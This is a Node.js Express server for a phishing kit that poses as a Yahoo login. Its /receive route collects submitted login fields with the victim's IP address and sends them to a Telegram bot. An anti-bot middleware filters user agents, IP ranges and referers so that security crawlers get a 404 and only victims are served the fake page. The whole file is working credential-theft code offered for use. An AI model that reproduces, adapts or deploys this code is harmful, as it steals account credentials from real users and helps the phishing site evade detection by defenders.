const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./Config/settings.js');
const antibot = require('./middleware/antibot');
const { sendMessageFor } = require('simple-telegram-message');
let IpAddress;

app.use((req, res, next) => {
    IpAddress = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    console.log('Client IP Address:', IpAddress); // <-- Use IpAddress here
    next();
});


// Middlewares
app.use(express.static(path.join(`${__dirname}`)));

const port = 3000; // You can use any available port
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post('/receive', (req, res) => {

    
  // Initialize a variable to collect the POST data
  let message = '';
  let myObject = req.body;

  message += `✅ UPDATE TEAM | YAHOO | USER_${IpAddress}\n\n` +
             `👤 LOGIN INFO\n`;
  
  const myObjects = Object.keys(myObject);

  for (const key of myObjects){
    console.log(`${key}: ${myObject[key]}`);
    message += `${key}: ${myObject[key]}\n`;
  }

    // Now you can handle the data or send it as needed
    console.log(message); // This should be inside the 'end' event callback
    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

    // Send a response back to the client if needed
    res.send('Data received and processed.');
  });




const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { getClientIp } = require('request-ip');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { use } = require('express/lib/router');

function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}


// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        // It's a bot, return a 404 response or handle it as needed
        return res.status(404).send('Not Found');
    } else {
        // It's not a bot, serve the index.html page
        res.sendFile(path.join(__dirname, 'index.html'));
    }
}



// Middlewares
app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));


